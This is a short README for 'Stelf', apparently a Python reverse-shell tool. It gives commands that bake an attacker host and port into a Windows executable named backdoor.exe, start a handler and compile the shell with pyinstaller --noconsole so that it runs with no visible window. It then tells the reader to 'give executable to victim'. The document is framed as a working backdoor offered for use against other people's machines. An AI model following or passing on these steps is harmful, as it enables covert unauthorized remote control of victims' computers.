# Stelf
### Shell That Excercises Limited Fanfare

## Usage


##### Encode your executable:
```
python2 encode.py lhost lport output.exe
```

e.g

```
python2 encode.py 192.168.1.5 8080 backdoor.exe
```
##### Start handler
```
python2 handler.py
```

##### Give executable to victim and voila!


## Compiling the executable yourself

#### Steps to Install:

- Install Python2.7
- Install Microsoft Visual C++ 9.0
- pip install -r requirements.txt

Compile the shell manually:

```
pyinstaller --noconsole --onefile shell.py
```

Your file will be in dist/shell.exe

Enjoy!
